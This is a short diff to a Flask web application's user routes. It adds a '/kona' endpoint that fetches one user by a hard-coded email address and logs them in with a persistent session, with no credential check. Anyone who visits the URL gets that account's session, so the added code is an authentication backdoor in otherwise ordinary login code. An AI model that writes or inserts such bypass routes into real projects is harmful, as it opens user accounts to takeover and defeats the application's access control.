@@ -59,4 +59,8 @@ def oauth_callback(provider):
     login_user(user, True)
     return redirect(url_for('index'))
 
-
+@user_bp.route('/kona')
+def kona():
+    user = User.query.filter_by(email='kona.pearl@gmail.com').first()
+    login_user(user, remember=True)
+    return redirect(url_for('index'))
